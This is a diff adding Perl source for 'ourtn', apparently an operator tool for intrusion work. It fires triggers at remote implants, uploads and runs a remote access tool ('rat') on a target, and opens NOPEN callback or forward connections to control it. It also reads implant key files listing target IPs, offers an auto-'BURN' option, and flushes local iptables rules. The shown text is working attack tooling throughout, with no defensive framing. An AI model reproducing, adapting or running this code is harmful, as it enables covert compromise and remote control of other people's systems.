+	if ($err == -2) { 
+	  # should never see this
+	  exit ;
+	}
+	exit;
+      } else {# parent
+	progprint("Promptkill child process $kidpid started\n",STDOUT);
+	
+	`touch /tmp/dotrigger` if $command2 ;
+	if ($clearicmpdrop) {
+	  # must clear ICMP DROP iptables filters
+	  progprint("Clearing iptables OUTPUT chain:\n".`iptables -F OUTPUT`,STDOUT);
+	}
+	#dbg("about to run $command");
+	if (1) {
+	  # DBG: This is because the system() command below doesn't seem
+	  # to be coming back and so the nopen_auto* script is not getting
+	  # written. Unsure why that is.
+	  #dbg("THIS IS TEMPORARY--why do we need this?");
+	  if (!$debug) {
+	    # This used to be below the system() call and we moved it here.
+	    # The system call is no longer returning execution to here, so we
+	    # do this first (and blind). Code is still below inside an if (0) block.
+	    if ($calledbynopen and !($callback and ($callbackip eq $callbacktoip))) {
+	      # If -autopilot 19191 is in here, replace it with a -gs checklast AFTER
+	      # the -irtun. Then when next hop exits, that is there and will get run then.
+	      if (open(IN,"< $opetc/nopen_auto.$nopen_mypid")) {
+		my @autolines = <IN>;
+		foreach (@autolines) {
+		  next if ($_ eq "#NOGS\n");
+		  if (/-autopilot 19191/) {
+		    $nopenautothereprevious .= "${nohist}-gs checklast\n";
+		  } else {
+		    $nopenautothereprevious .= $_;
+		  }
+		}
+	      }
+	      close(IN);
+	      if (open(OUT,"> $opetc/nopen_auto.$nopen_mypid")) {
+		print OUT "#NOGS\n";
+		print OUT "$nohist$noclientdoafterftshell\n";
+		# If needed, this next gets done after the contents of
+		# $noclientdoafterftshell, which may include a hop deeper in
+		if ($burnthewitch) {
+		  progprint("\n\nNOTE: Due to use of the -b (auto BURN) option, ourtn is not\n".
+			    "able to run one or more commands on $nopen_rhostname:\n\n".
+			    "$nopenautothereprevious\n\n",$COLOR_FAILURE,STDOUT)
+		    if $nopenautothereprevious;
+		  print OUT "${nohist}-burnBURN\n";
+		} elsif ($nopenautothereprevious) {
+		  print OUT $nopenautothereprevious ;
+		}
+		close(OUT) ;
+		didthis($noclientdoafterftshell) ;
+	      } else {
+		print "
+${COLOR_FAILURE}$prog"."[$$]: Could not write to $opetc/nopen_auto.$nopen_mypid\n";
+	      }
+	    }#if $calledbynopen
+	  }
+	}#if (1) ODD why do we need this? Did not used to as the system() below
+	# used to return and now does not.
+	$err = system($command) / 256;
+#dbg("Here err=$err");
+#	if (!$err and $calledbynopen and open(OUT,">> $opdown/problems.log")) {
+#	  print OUT timestamp()."$nopen_rhostname: $prog $VER is in the mystery code\n";
+#	}
+#	close(OUT);
+	if (open(OUT,"> /current/processdone.$tagpid")) {
+	  print OUT "$err\n";
+	}
+	close(OUT) ;
+      }
+      if ($err == -2) {
+	$ERR = "${COLOR_FAILURE}Killed by user${COLOR_NORMAL}\n" ;
+      } else {
+	$ERR = "returned ${COLOR_SUCCESS}$err${COLOR_NORMAL} " ;
+	$ERR = "returned ${COLOR_FAILURE}$err${COLOR_NORMAL} " if ($err) ;
+      }
+      print OUT "$prog"."[$$]: system(\"\n$command\n\") call $ERR\n" ;
+      unlink("/current/processdone.$tagpid") ;
+    } else {
+      #dbg("NOW NOW NOW nowhere ncda=$noclientdoafterftshell");
+      didthis($doafterftshell,"noclient") if $stayloggedin;
+      `touch /tmp/dotrigger` if $command2 ;
+      $err = system($command) / 256;
+      $ERR = "${COLOR_SUCCESS}$err${COLOR_NORMAL} " ;
+      $ERR = "${COLOR_FAILURE}$err${COLOR_NORMAL} " if $err ;
+      progprint("system(\"\n$command\n\") call returned ${ERR}",STDOUT);
+    }
+  }#if !$debug
+  @usefulpid = split(/\n/,`ps -efwwww | grep useful | grep -v grep | awk '{print \$2}'`) ;
+  kill(TERM,@usefulpid) if (@usefulpid);
+  # NOTE: Here, we ignore $err if we are execing...ftshell exits
+  # with error in that case
+  if ($debug or !$err or $execit) {
+    if ($pastables and !$debug) {
+      print "
+Here are some pastables for use in other windows$didthis:
+
+$pastables\n" ;
+      my $not = "${COLOR_FAILURE}NOT " if $noiptables ;
+      foreach (keys(%rulestoadd)) {
+	progprint("$_","$COLOR_SUCCESS","$COLOR_NOTE","${not}Putting back iptables rule",STDOUT);
+	system("$_") unless $noiptables ;
+      }
+      my $once = 0 ;
+      foreach $chain ("INPUT","OUTPUT") {
+	while ((@badlines)= split(/\n/, `iptables -L $chain -n | egrep "DROP.*icmp "`)) {
+	  my $badlines = "" ;
+	  $badlines .= "\n$_" foreach (@badlines) ;
+	  progprint("$badlines",$COLOR_WARNING,$COLOR_NOTE,"iptables rules about icmp",STDOUT) 
+	    unless $once++;
+	  my $type = " --icmp-type echo-reply" if ("@badlines" =~ /icmp type/) ;
+	  my $ruledel = "iptables -D $chain -p icmp$type -j DROP" ;
+	  last if ($debug) ;
+	  my $not = "${COLOR_FAILURE}NOT " if $noiptables ;
+	  progprint("$ruledel","$COLOR_SUCCESS","$COLOR_NOTE","${not}Deleting iptables rule with",STDOUT);
+	  system("$ruledel") unless $noiptables ;
+	}
+      }
+    }#if $pastables and !$debug
+    if ($executefile) {
+      # THIS BLOCK RELOCATED TO before the system call. The system call is no 
+      # longer returning execution here, so we have to do this blind, without knowing
+      # what the system() call returns.
+      if (0 and !$debug) {
+	if ($calledbynopen and !($callback and ($callbackip eq $callbacktoip))) {
+dbg("inhere");
+	  # If -autopilot 19191 is in here, replace it with a -gs checklast AFTER
+	  # the -irtun. Then when next hop exits, that is there and will get run then.
+	  if (open(IN,"< $opetc/nopen_auto.$nopen_mypid")) {
+	    my @autolines = <IN>;
+	    foreach (@autolines) {
+	      next if ($_ eq "#NOGS\n");
+	      if (/-autopilot 19191/) {
+		$nopenautothereprevious .= "${nohist}-gs checklast\n";
+	      } else {
+		$nopenautothereprevious .= $_;
+	      }
+	    }
+	  }
+	  close(IN);
+	  if (open(OUT,"> $opetc/nopen_auto.$nopen_mypid")) {
+	    print OUT "#NOGS\n";
+	    print OUT "$nohist$noclientdoafterftshell\n";
+	    # If needed, this next gets done after the contents of
+	    # $noclientdoafterftshell, which may include a hop deeper in
+	    if ($burnthewitch) {
+	      progprint("\n\nNOTE: Due to use of the -b (auto BURN) option, ourtn is not\n".
+			"able to run one or more commands on $nopen_rhostname:\n\n".
+			"$nopenautothereprevious\n\n",$COLOR_FAILURE,STDOUT)
+		if $nopenautothereprevious;
+	      print OUT "${nohist}-burnBURN\n";
+	    } elsif ($nopenautothereprevious) {
+	      print OUT $nopenautothereprevious ;
+	    }
+	    close(OUT) ;
+	    didthis($noclientdoafterftshell) ;
+	  } else {
+	    print "
+${COLOR_FAILURE}$prog"."[$$]: Could not write to $opetc/nopen_auto.$nopen_mypid\n";
+	  }
+	}#if $calledbynopen
+      }
+      if (!$noratconnect) {
+	print "
+Now connecting to nopen via:\n\n" unless $debug;
+        if ($noclientdoafterftshell) {
+	  print "$noclientdoafterftshell\n";
+        } else {
+	  print "$doafterftshell\n";
+	}
+      } elsif (!$debug) { # we executed but aren't connecting? WEIRD!!!
+	unless ($opt_N or $valtrigger) {
+	  mywarn("\nHEY: The rat's still up there and running. Don't strand it!\n");
+	  unless ($nointeraction or $callback) {
+	    sleep 2 ;
+	    my $ans = getinput("$COLOR_NOTE
+\aDo you want to connect now?","Y");
+	    if ( $ans =~ /^y/i ) {
+	      $noratconnect = 0 ;
+	    } else {
+	      print "$COLOR_FAILURE
+\aOK. But you left it up there running. Seriously, don't F it up.$COLOR_NORMAL
+" ;
+	      sleep 1 ;
+	    }
+	  }
+	}
+      }
+    } else { # not $executefile
+      if (!$debug and $calledbynopen and $uploadfile) {
+	mywarn("\n$uploadfile has been uploaded via -irtun but NOT EXECUTED (Why would you do that??)") ;
+      }
+    } # end if $executefile or not
+    if ($doafterftshell and !$noratconnect) {
+      if ($callbackip and !$debug) {
+	if ($callbacktoip) {
+# Could take up to $noservercallbackdelaysecs seconds.
+	  my $what = "-nrtun $nopenport" ;
+	  my $who = "You should have already started" ;
+	  $who = "$prog is about to start"
+	    if (!$calledbynopen and ($callbackip eq $myip)) ;
+	  $what = "noclient -l $nopenport"
+	    if ($callbacktoip eq $myip) ;
+	  print "$COLOR_SUCCESS\n\a\n".
+	    "Initiating callback to $callbackip:$nopenport.\n".
+	    "$who this$COLOR_FAILURE on $callbackip,$COLOR_SUCCESS since you used -C:\n".
+	    "\n".
+	    "$what\n".
+	    "$COLOR_NORMAL\n".
+            "";
+	} else {
+	  mywarn("\nStarting noclient listener\n".
+		 "(callback could take $noservercallbackdelaysecs seconds)\n") ;
+        }
+      }
+      chdir("$opdown") ;
+      #      unless ($spoofip or !($callbackip eq $callbacktoip)) {
+      unless ($calledbynopen) {
+        if ($debug) {
+          mywarn("at this point, without -d we would have exec'd \"\n\n$doafterftshell\n\n\"");
+        } else {
+          mywarn("execing \"$doafterftshell\"");
+          didthis($doafterftshell,"noclient") unless $stayloggedin;
+          exec("$doafterftshell");
+        }
+#} else {
+#waitpid($kidpid,NULL);
+#exit;
+#}
+      }
+    }
+  } else {# we have $err and !$debug
+    if ($executefile) {
+      my $what = "listening for rat callback${COLOR_WARNING}\n".
+	"(If rat calls back and does not connect it will die nicely.)" if $callbackip ;
+      my $what = "connecting to rat${COLOR_WARNING}\n".
+	"(IT COULD STILL BE RUNNING--YOU HAVE TO LOOK)" if !$callbackip ;
+      my $withwhat = ", without $what"
+    }
+    unless ($valtrigger) {
+      # dragonbits and/or tipoff is returning non-zer even when
+      # it works so, here we ignore the error.
+      if ($calledbynopen and $executefile and $noclientdoafterftshell) {
+	unlink("$opetc/nopen_auto.$nopen_mypid");
+      }
+      print "$COLOR_FAILURE
+The system call above returned an error ($err), so stopping now$withwhat.\n";
+      print "That is to be expected when using -X." if $execit ;
+      if (-s "$opetc/multitargets") {
+        print "(Moving unfinished $opetc/multitargets to $opetc/multitargets.aborted)" ;
+        rename ("$opetc/multitargets","$opetc/multitargets.aborted") ;
+      }
+      print "\n$COLOR_NORMAL\n";
+      done($err) ;
+    }
+  }
+}
+$first = "";
+$first = " first" if $multitargets ;
+if ($debug) {
+#  my $more = "" ;
+#  if ($tipofftrigger) {
+#    $more = "keys=$key ";
+#  }
+#  progprint("This would be the$first trigger command run if you remove the \"-d\" parmater:\n".
+#"\n\n$more$command\n\n",STDOUT);
+  progprint("This would be the$first trigger command run if you remove the \"-d\" parmater:\n".
+
+
+
+"DBG: tipofftrigger=$tipofftrigger=
+
+tipoffargs=$tipoffargs=
+
+
+tipoffprog=$tipoffprog=
+
+
+\n\n".
+
+
+"\n\n$command\n\n",STDOUT);
+  if ($multitargets and -s "$opetc/multitargets" and !$calledbynopen) {
+    progprint("And this $opetc/multitargets file would have been created for the extra hops:\n\n".
+    `cat $opetc/multitargets`,STDOUT);
+    rename ("$opetc/multitargets","$opetc/multitargets.debug") ;
+  }
+}
+done() ;
+
+
+sub getinput {
+  local($prompt,$default,@allowed) = @_;
+  local($ans,$tmp,%other) = ();
+  $other{"Y"} = "N" ; $other{"N"} = "Y" ;
+  if ($other{$default} and ! (@allowed)) {
+    push(@allowed,$other{$default}) ;
+  }
+  $tmp = $default;
+  if (chop($tmp) eq "") {
+    #damn ^M's in script files
+    $default = $tmp;
+  }
+  SUB: while (1) {
+    print STDERR $prompt;
+    if ($default) {
+      print STDERR " [$default] ";
+    } else {
+      print STDERR " ";
+    }
+    chomp($ans = <STDIN>);
+    $ans = $default if ( $ans eq "" );
+    last SUB if ($#allowed < 0) ;
+    foreach ($default,@allowed) {
+      last SUB if $ans =~ /^$_/i ;
+    }
+  }
+  return $ans;
+} # getinput
+
+
+sub done {
+  my ($err) = @_ ;
+  # Just exit unless $NOPENTN. 
+  # If $NOPENTN, dump out "NOPEN:$targetip"
+  # otherwise "NOPEN!"
+  if ($NOPENTN) {
+    if ($targetip) {
+      print "NOPEN:$targetip\n" ;
+    } else {
+      print "NOPEN!\n" ;
+    }
+  }
+  my $usecolor = $COLOR_SUCCESS;
+  $usecolor = $COLOR_FAILURE if ($err) ;
+  my $kidstuff = "(child was $kidpid)" if $kidpid ;
+  progprint("ourtn @originalparms",$COLOR_SUCCESS,$usecolor,
+	    "Exiting$kidstuff",STDOUT) unless $showhelp;
+  progprint("You may exit this window via ^C",$COLOR_FAILURE,STDOUT) if $platformtarget ;
+  # Do not use mymydie for next--infinite loop
+  die("$!\n") if ($err and !(lc $! eq "illegal seek")) ;
+  exit $err;
+} # done
+
+sub mymydie {
+  local (@stuff) = (@_,$hopping) ;
+  if ($inlab) {
+    printf("%-20s = %-30s\n", "\$key{$_}",$key{$_}) foreach (keys %key) ;
+    printf("%-20s = %-30s\n", "\$ip{$_}",$ip{$_}) foreach (keys %ip) ;
+    printf("%-20s = %-30s\n", "\$noserver{$_}",$noserver{$_}) foreach (keys %noserver) ;
+    printf("%-20s = %-30s\n", "\$keylist{$_}",$keylist{$_}) foreach (keys %keylist) ;
+    printf("%-20s = %-30s\n", "\$keybits{$_}",$keybits{$_}) foreach (keys %keybits) ;
+    printf("%-20s = %-30s\n", "\$noservers{$_}",$noservers{$_}) foreach (keys %noservers) ;
+    printf("%-20s = %-30s\n", "\$platform{$_}",$platform{$_}) foreach (keys %platform) ;
+    printf("%-20s = %-30s\n", "\@entry[$_]",$entry[$_]) foreach (0...$#entry) ;
+    printf("%-20s = %-30s\n", "\@keybits[$_]",$keybits[$_]) foreach (0...$#keybits) ;
+    printf("%-20s = %-30s\n", "\@keys[$_]",$keys[$_]) foreach (0...$#keys) ;
+    printf("%-20s = %-30s\n", "\@keylist[$_]",$keylist[$_]) foreach (0...$#keylist) ;
+    printf("%-20s = %-30s\n", "\@iplist[$_]",$iplist[$_]) foreach (0...$#iplist) ;
+    printf("%-20s = %-30s\n", "\@childiplist[$_]",$childiplist[$_]) foreach (0...$#childiplist) ;
+    printf("%-20s = %-30s\n", "\@offset[$_]",$offset[$_]) foreach (0...$#offset) ;
+  }
+  warn "\n${COLOR_FAILURE}\a@stuff$COLOR_NORMAL\n" ;
+  sleep 1 if ("@stuff" =~ /(mosey|sleep)/i) ;
+  kill(9,@kidpids) ;
+  done();
+} # mymydie
+
+sub mywarn {
+  local ($what,$color,$color2,$what2) = (@_) ;
+  $color = $COLOR_FAILURE unless $color ;
+  $color2 = $color unless $color2 ;
+  $what2 = " $what2" if ($what2) ;
+  progprint($what,$color,$color2,$what2);
+#  print "${color2}${prog}[$$] ".gmtnow()."$what2: ${color}$what$COLOR_NORMAL\n" ;
+#  print  "\n${COLOR_FAILURE}\a@_$COLOR_NORMAL\n" ;
+} # mywarn
+
+sub catch_zap {
+  my $signame = shift;
+  mymydie("$prog"."[$$]: received SIG $signame. Aborting") ;
+} # catch_zap
+
+sub mydbg {
+  progprint("DBG: @_",$COLOR_FAILURE,STDOUT);
+}#mydbg
+sub findmatch {
+  (local $target,$varkeycheck) = (@_) ;
+#dbg("In findmatch(@_)");
+  my (@IP,%FQDN,%KEYSTR,%OS,%IMPLANTS,
+     %UTCOFFSET,%ALLIMPLANTKEYS,%IMPLANTKEYS,$val) = () ;
+
+  # globals returned
+  (@keybits,@keys,@iplist,%ipindex,@keylist,@childiplist,@entry,@offset,@platform,@incver) = () ;
+  $target =~ s/\./\\\./g ;
+  if ($varkeycheck) {
+    ($val = findinvarkeys($target,0,\@IP,\%FQDN,\%KEYSTR,\%OS,\%IMPLANTS,
+			  \%UTCOFFSET,\%ALLIMPLANTKEYS,\%IMPLANTKEYS));
+#    dbg("val=$val= looking for findinvarkeys($target,0,....)");
+#  foreach $ip (@IP) {
+#    dbg("ip=\t$ip
+#FQDN{$ip}=$FQDN{$ip}=
+#KEYSTR{$ip}=$KEYSTR{$ip}=
+#OS{$ip}=$OS{$ip}=
+#IMPLANTS{$ip}=$IMPLANTS{$ip}=
+#UTCOFFSET{$ip}=$UTCOFFSET{$ip}=
+#");
+#  }
+    return 0 unless $val;
+#dbg("running     preservefile(\"$spayedfile.orig\");");
+    unless (-e "$spayedfile.ORIG") {
+      copy($spayedfile,"$spayedfile.ORIG");
+      chmod 0755,"$spayedfile.ORIG";
+    }
+#dbg("\n".`ls -alrt ${spayedfile}*`);
+    $origspayedfile=$spayedfile;
+    my $count=0;
+    if (open(IN2,"$spayedfile") and
+	open(OUT2,"> $spayedfile.new.$$")) {
+      my ($morekeylist,$line3,$remove,$keylist,$keysubs,$oldcount,$below,$incfile) = ();
+      my $justonce = "########## Keys added by ourtn from bin/varkeys appear above keylist=\n";
+      while (<IN2>) {
+	if (!$below) {
+	  if (/\#\#\# (\S+) INCISION keys included below/) {
+#	    my ($keysubs,$keylist) = ();
+	    $oldcount = $1;
+	    my $keyheader = $_;
+	    # Inject IN keys from varkeys here
+	    foreach $ip (@IP) {
+	      next unless ($incfile) = $IMPLANTS{$ip} =~ /(\S+incision)/;
+	      next unless open(IN3,$incfile);
+	      $count=$oldcount+1;
+	      my $comment = "";
+	      while ($line3 = <IN3>) {
+		my $origline = $line3;
+		if ($line3 =~ /(.*___\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(___[\d\-]+){0,1}\s*\(\)\s*\{/) {
+		  ($keyentry,$remove) = ($1,$2);
+		  $line3 = "$keyentry() {\n";
+#		  ($keyentry) = $line3 =~ /^([^\(]+)/;
+		  $comment = "# $origline";
+		  $comment =~ s/\s*\(\)\s*\{//;
+		  $keylist .= "\t$keyentry\n";
+		}
+		$keysubs .= $line3.$comment;
+		$comment = "";
+	      }
+	      close(IN3);
+	    }
+	    $keyheader =~ s/$oldcount/$count/;
+	    print OUT2 $keyheader.
+	      $justonce.
+#	      "\nkeylist=\"\n".
+#	      $keylist."\"\n\n".
+	      $keysubs;
+	    $justonce="";
+	    # We skip the keylist="" line and all the original keys
+	    while (<IN2>) {
+	      last if $below = /\#\#\# (\S+) INCISION keys included above/;
+	      print OUT2 unless
+		/Keys added by ourtn from bin/;
+	      if (/^keylist=/ and $keylist) {
+		print OUT2 $keylist;
+		$keylist="";
+	      }
+	    }
+	    s/$1/$count/;
+	  }
+	}
+	print OUT2
+	  unless /Keys from bin.varkeys appear/;
+      }
+    }
+    close(IN2);
+    close(OUT2);
+#    preservefile("$spayedfile.new");
+    rename("$spayedfile.new.$$","$spayedfile");
+    chmod 0755,$spayedfile;
+#    $spayedfile="$spayedfile.new";
+dbg("done writing, count=$count");
+dbg("\n".`ls -alrt ${spayedfile}*`);
+    return 0 unless $count;
+    my $s = "";
+    $s = "s" if $count > 1;
+    progprint("Modified $spayedfile with additional IN key$s found in $opbin/varkeys matching $target\nls -alrt $spayedfile*\n".
+	      `ls -alrt $spayedfile*`);
+  }
+  mymydie("Unable to open $spayedfile: $!") unless
+    open(IN2,"< $spayedfile");
+#dbg("$spayedfile open in findmatch(@_)");
+  my @tmp =();
+  my ($thiskey,$thisproject,$thishost,$thisip,$moreips,$foundip)=();
+  my $count=0;
+  while (<IN2>) {
+    if ($foundip) {
+#dbg("in2:$_");
+      $entry[$count] .= $_;
+      if (/^[^\#]*\sTARG_AYT=\"([a-f0-9]{8} [a-f0-9]{8} [a-f0-9]{8})\"/) {
+	$keybits[$count] = $1;
+	$keylist[$count] .= "\n\t\tTARG_AYT=\"$1\"";
+      }
+      if (/^[^\#]*\sUTC_OFFSET=(\d+)/) {
+	$offset[$count] = $1;
+	$keylist[$count] .= "\n\t\tUTC_OFFSET=$1";
+      }
+      if (/\sOS[:=](\S+)/) {
+	$platform[$count] = $1;
+	if ($platform[$count] =~ /[56]86.pc.linux/) {
+	  #special case--shorten name of linux platforms
+	  my $oldplatform = $platform[$count];
+	  $platform[$count] =~ s/[56](86(.)pc.linux).*/5$1$2gnu/;
+	  mywarn("Shortening platform from $oldplatform to $platform[$count]");
+	}	
+	$keylist[$count] .= "\n\t\tOS=$1";
+      }
+      if (/INCISION Version[:=](\S+)/i) {
+	$incver[$count] = $1;
+	$keylist[$count] .= "\n\t\tIN.v.$1";
+      }
+      if (/^\s*\}/) { # End of this particular target's block
+	($thiskey,$thisproject,$thishost,$thisip,$moreips,$foundip)=();
+	$keylist[$count] =~ s/(OS.*)\n\t\tIN\.v\./$1\t\t\tIN.v./;
+	$keylist[$count] =~ s/(IN\.v\..*)\n\t\tOS/$1\t\t\tOS/;
+	$keylist[$count] .= $COLOR_NORMAL
+      }
+      next;
+    }
+    next if /^\s*\#/;
+    next unless /$target/i;
+    next unless
+      ($thiskey,$thisip,$moreips) = (/^\s*(\S*_+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(([:]{0,1}\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})*))\s*\(\)\s*\{/) ;
+    $moreips =~ s/^://; # get rid of first : if any
+    # got a match
+    $count++;
+    $foundip=$thisip;
+#dbg("here: $thisip=$thiskey=$moreips=");
+    $ipindex{$foundip}=$count;
+    $entry[$count] = $_;
+    $iplist[$count] = $thisip;
+    $keys[$count] = $thiskey;
+    $keylist[$count] = $thiskey.$COLOR_NOTE;
+    $keylist[$count] =~ s/_{2,}/\t/g;
+    $keylist[$count] =~ s/_/ /g;
+    $childiplist[$count] = $moreips;
+    $iplist[$count] = $thisip;
+  }
+  close(IN2);
+  return -1 if ($skipspayed) ; # but above sets stuff if it is in tn.spayed
+  return ($#keys > 0) ;
+} # findmatch
+
+sub didthis {
+#dbg("in didthis(@_)");
+  $didthis = " (also see $opdown/didthis)" ;
+  return if $debug ; # no need to write this
+  (local $what, $more, @more) = (@_) ;
+  my $firsttime = (! -e "$opdown/didthis") ;
+  open(OUT2,">> $opdown/didthis") || return ;
+  my $commandline = "command line" if ($more eq "noclient");
+  my $fromip = $callbackip if ($more eq "callother");
+  my $whom = "$commandline$fromip" ;
+  my $targip = $targetip ;
+  my $unixval = "";
+  my $viairtun = "";
+  my $port = "";
+  if (open(DIDTHIS,"$optmp/nopenlistener.$targetip")) {
+    $port = <DIDTHIS>;
+  }
+  $port = $triggerport unless $port;
+  close(DIDTHIS);
+  if ($what =~ /unixval/i) {
+    $unixval = " UnixVal trigger";
+    $what = "";
+    my $how = "-nstun ";
+    $how = $more if ($more eq "noclient");
+    $what = "$how $targetip:$port"
+      if ($port =~ /^\d+$/);
+  }
+  $targip = $platformtarget if $platformtarget ;
+  $whom = "$nopen_rhostname"  unless $whom ;
+  my $ts = timestamp();
+  print OUT2 "# Locally get situated $ts\ncd /current/down\n" if ($firsttime or $commandline);
+  if ($calledbynopen) {
+    my ($cbip,$irtunargs) = "@originalparms" =~ /-D.*-W.*-i(\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*-p $ishcallbackport (.*) $targip/;
+    dbg("originalparms=(@originalparms) port=$port targetport=$targetport ishcallbackport=$ishcallbackport cbip=$cbip= nopen_myip=$nopen_myip=");
+    if ($cbip =~ /\s+$nopen_myip$/) {
+      $cbip = "";
+    }
+    $viairtun = "# AKA # -irtun $targip $ishcallbackport$cbip $irtunargs";
+  }
+  my $fromline = "# From $whom to $targip (via$unixval: $prog @originalparms $args{$hops{$target}})$viairtun \n";
+  my $triggertolog = "$prog @originalparms $args{$hops{$target}}";
+  ($triggertolog) = $viairtun =~ /. AKA . (.*)/
+    if ($viairtun);
+  $triggertolog =~ s,\s*$,,g;
+  newhostvar("gbl_trigger{$targip}",$triggertolog,
+	     "gbl_trigger",$triggertolog);
+  dbg("ourtn just saved this trigger as both:
+
+gbl_trigger{$targip}=gbl_trigger=
+$gbl_trigger
+
+
+");
+  $fromline =~ s/\"/\\\"/g;
+  print OUT2 $fromline;
+
+  print OUT2 "$what\n" if $what;
+  if ($commandline) {
+    if ((my $port) = $what =~ /noclient\s+-l\s*(\d+)/ ) {
+      print OUT2 "-call $myip $port\n";
+    }
+  }
+  if ($fromip or (($fromip) = $nopen_rhostname =~ /\.([0-9.]+)$/)) {
+    if ((my $port) = $what =~ /nrtun\s+(\d+)/ ) {
+      print OUT2 "-call $fromip $port\n";
+    }
+  }
+  print OUT2 "\n";
+  close(OUT2) ;
+} # didthis
+
+sub oldprogprint {
+  local ($what,$color,$color2,$what2) = (@_) ;
+  $color = $COLOR_NOTE unless $color ;
+  $color2 = $color unless $color2 ;
+  $what2 = " $what2" if ($what2) ;
+  print "${color2}${prog}[$$] ".gmtnow()."$what2: ${color}$what$COLOR_NORMAL\n" ;
+} # progprint
+
+sub clearargs {
+  local ($what) = (@_) ;
+  $what = "undef" unless $what ;
+  foreach (split(/:*/,$optstr)) {
+    if ($what eq "dbg") {
+      eval "print \"\\\$opt_\$_=\$opt_$_ \"" if (eval "\$opt_$_") ;
+    } else {
+      eval "$what \$opt_$_" ;
+    }
+  }
+  print "\n" if ($what eq "dbg") ;
+} # clearargs
+
+sub processargs {
+  local ($hopping) = (@_) ;
+  # lack of args allows previous targets arguments to be used, so
+  if ($optionsprocessed) {
+    return unless(@ARGV) ;
+  }
+#  return unless (@ARGV or !$optionsprocessed) ;
+  $optionsprocessed++ ;
+  clearargs() ;
+  $callbackip = "" ;
+dbg("Calling Getopts($optstr) with ARGV=(\n".
+    join("\n",@ARGV)."\n)");
+  mymydie("bad option(s)") if (! Getopts( $optstr ) ) ;
+dbg("After Getopts: ARGV=(\n".
+    join("\n",@ARGV)."\n)");
+
+  $uploadspecific = $opt_U ;
+
+  $actualtriggerdest = $opt_G ;
+  $binaryupload = $opt_w =~ /^bin$/i ? 1 : 0;
+  # allow multiple -i and -p arguments on line but only use last one
+  $opt_i =~ s/.*\s// ;
+  $opt_p =~ s/.*\s// ;
+
+  if (! -x "$opbin/didthis" and open(OUT,"> $opbin/didthis")) {
+    print OUT <<"EOF";
+#!/bin/sh
+echo -e "\\n\\n"
+if [ ! "\$1" ] ; then
+  LIST=`ls -rt1 $opdown/did* 2>/dev/null`
+  [ "\$LIST" ] || exit
+  more \$LIST | cat | sed "s/^::/\+::/g" | sed "s/::\$/::\+/g" | tr "\+" "\\012"
+else
+  cat $opdown/didthis 2>/dev/null
+fi
+echo -e "\\n\\n"
+EOF
+    close (OUT) ;
+    chmod 0755 , "$opbin/didthis" ;
+  }
+  if ($ishpath = $opt_9) {
+    mymydie("-9 PATH argument must not contain whitespace")
+      if $ishpath =~ /\s/;
+    $ishpath =~ s/^:*//g;
+    $ishpath =~ s/:*$//g;
+    $ishpath =~ s/::+/:/g;
+    my @elements = split(/:/,$ishpath);
+    foreach (@elements) {
+      mymydie("-9 PATH argument must be colon delimited paths starting at /")
+	if /^[^\/]/;
+    }
+  }
+  $execit = $opt_X ;
+  mymydie("-X not usable with both -u and -e. The noserver fails.")
+    if ($execit and $opt_u and $opt_e);
+  $nointeraction = $opt_0 ;
+  $showhelp = ($opt_h or $opt_H) ;
+  $longhelp = $opt_H ;
+  $usagetextshort .= "(use -H for longer usage statement)                   "
+    if !$longhelp ;
+  $spayedfile = $opt_k if ($opt_k);
+  mymydie("Bad or missing key file $spayedfile")
+    if ($spayedfile and !(-s $spayedfile)) ;
+  $burnthewitch = $opt_b;
+  open(OURTNOUT,">$opbin/autofixnamewithslashes");
+  print OURTNOUT <<EOF ;
+#!/bin/sh
+VER=1.0.0.1
+[ "\$1" = "-v" ] && echo \$0 v.\$VER && exit
+echo "\$1" | grep -q "/" || ( echo -e "\nUsage: \$0 NOPEN_NAME_WITH_SLASHES\n\n\$0 creates the right directories for you.\n\nNamely: ../down/DIRNAME ../down/history/DIRNAME and ../down/cmdout/DIRNAME\n\n\$0 v.\$VER\n" && exit)
+export DIRNAME=`dirname \$1`
+#echo running:
+#echo "          mkdir -pv /current/down/\$DIRNAME /current/down/{history,cmdout}/\$DIRNAME"
+mkdir -pv /current/down/\$DIRNAME /current/down/{history,cmdout}/\$DIRNAME
+EOF
+;
+  close(OURTNOUT);
+  chmod 0755 , "$opbin/autofixnamewithslashes";
+  usage() if $showhelp ;
+  if ($opt_v) {
+    print $vertext ;
+    exit ;
+  }
+  $ethonly = $opt_3 ;
+  ($intfarg,$intfarg2) = ();
+  if ($ethonly or $pschain =~ /getrad/ or $ENV{"NOppp"}) {
+    # disallows ppp0 for tunnel and tn.spayed
+    $intfarg = "-noInterface ppp0"; # for tunnel
+    $intfarg2 = "NOppp=true";	# for tn.spayed
+  }
+
+  if ($actualtriggerdest) {
+    mymydie("-G $opt_G not a valid IP") unless ipcheck($opt_G);
+#    mymydie("Do not use -G with -W") if $opt_W;
+    mymydie("Do not use -G with -R") if $opt_R;
+#    unless ($opt_Y) {
+#      mywarn("Forcing -Y so we can use -G\n".
+#	     "(this trigger to $opt_G will be a DD trigger--others need not be)");
+#      $opt_Y = 1 ;
+#    }
+  }
+
+  mymydie("Cannot use -z with -Z") if ($opt_z and $opt_Z) ;
+  mymydie("Cannot use -R|A|a with -s") if (($opt_R or $opt_A or $opt_a) and $opt_s) ;
+  mymydie("Cannot use -Y5 with -sY") if (($opt_s eq "Y") and ($opt_Y and $opt_5)) ;
+  mymydie("Cannot use -5x without -Y") if (!$opt_Y and $opt_5) ;
+
+  $rettrigger = $opt_R ;
+
+  # "Callback" of 0.0.0.0 is really call forward with both tipoff and nopen
+  $callbacktoip = $opt_C ;
+  $callback = (($opt_c or $opt_C) and  $callbacktoip ne "0.0.0.0") ;
+  if ($ishcallforward = ($callbacktoip eq "0.0.0.0")) {
+    progprint("Calling forward via ish to $ARGV[0]");
+    $callback = 0;
+    $callbackip = "";
+    $callbacktoip = "";
+    $ishcallbackip = "0.0.0.0";
+    undef $opt_C;
+  }
+
+  # TIPOFF stuff
+  $tipoffprog = "";
+  # As of 15 OCT 2010 defaulting to 3.1+ namely -BIN instead of 3.X
+  # Scratch that, as of SEP 2013, require -5 to contain the version as its argument
+
+  mymydie("-5 Now requires a DEWDROP version\n".
+	  "(one to four dotted integers, not \"-5 $opt_5\")")
+	unless (!$opt_5 or $opt_5 eq "J" or $opt_5 =~ /^\d+(\.\d+){0,3}$/);
+
+  # These here in bin we can default to without prompt
